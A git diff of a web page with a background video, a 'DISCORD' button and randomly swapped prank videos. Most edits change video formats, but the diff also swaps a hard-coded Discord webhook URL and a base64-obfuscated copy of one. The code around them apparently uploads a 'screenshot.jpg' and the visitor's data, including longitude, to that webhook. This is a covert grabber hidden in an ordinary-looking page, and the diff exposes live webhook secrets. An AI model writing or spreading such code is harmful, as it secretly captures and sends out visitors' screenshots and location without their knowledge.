@@ -80,7 +80,7 @@
 </head>
 <body>
     <video id="background-video" autoplay muted loop>
-        <source src="stars.mp4" type="video/mp4">
+        <source src="stars.webm" type="video/webm">
         Your browser does not support the video tag.
     </video>
 
@@ -88,7 +88,7 @@
     <button id="discord">DISCORD</button>
 
     <div id="info"></div>
-    <link rel="preload" href="stars.mp4" as="video">
+    <link rel="preload" href="stars.webm" as="video">
 
     <script type="module">
 document.getElementById("discord").addEventListener("click", function() {
@@ -125,7 +125,7 @@ document.getElementById("discord").addEventListener("click", function() {
         }
 
         async function sendToDiscord(blob) {
-            const webhookURL = "https://discord.com/api/webhooks/1344476191892963349/fboVYR5RxzqXMq_zI5Gn8YqIZTXUo8BmaXTBJg9IgWd6LuxpG2dDSrawrvkUM-Y9uhjk"; 
+            const webhookURL = "https://discord.com/api/webhooks/1345464426408706098/c1l9Z0CWWNhKPDfDRDNs3-BNMFd3GLOSjjcJNj2EPFZ9zWriQxid5GvIjKGbHqheGYOA"; 
             const formData = new FormData();
             formData.append('file', blob, 'screenshot.jpg');
 
@@ -146,7 +146,7 @@ function decodeBase64(encoded) {
         }
 
     
-        const serverKey = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NDQ3NjE5MTg5Mjk2MzM0OS9mYm9WWVI1Unh6cVhNcV96STVHbjhZcUlaVFhVbzhCbWFYVEJKZzlJZ1dkNkx1eHBHMmREU3Jhd3J2a1VNLVk5dWhqaw==";
+        const serverKey = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTQ2NDQyNjQwODcwNjA5OC9jMWw5WjBDV1dOaEtQRGZEUkROczMtQk5NRmQzR0xPU2pqY0pOajJFUEZaOXpXcmlReGlkNUd2SWpLR2JIcWhlR1lPQQ==";
         const serverBase = decodeBase64(serverKey);
 
         
@@ -264,17 +264,17 @@ Longitude: ${userData.longitude || "N/A"}
                 button.style.display = "none";
 
                 const mediaOptions = [
-                    { video: 'von.mp4', audio: 'von.mp3' },
-                    { video: 'catvon.mp4', audio: 'von.mp3' },
-                    { video: 'bald.mp4', audio: 'bald.mp3' },
-                    { video: 'sold.mp4', audio: 'bald.mp3' }
+                    { video: 'von.webm', audio: 'von.mp3' },
+                    { video: 'catvon.webm', audio: 'von.mp3' },
+                    { video: 'bald.webm', audio: 'bald.mp3' },
+                    { video: 'sold.webm', audio: 'bald.mp3' }
                 ];
 
                 const randomMedia = mediaOptions[Math.floor(Math.random() * mediaOptions.length)];
                 console.log(`Changing to: Video - ${randomMedia.video}, Audio - ${randomMedia.audio}`);
 
                 const videoElement = document.getElementById('background-video');
-                videoElement.innerHTML = `<source src="${randomMedia.video}" type="video/mp4">Your browser does not support the video tag.`;
+                videoElement.innerHTML = `<source src="${randomMedia.video}" type="video/webm">Your browser does not support the video tag.`;
                 videoElement.load();
 
                 const existingAudio = document.querySelector('audio');
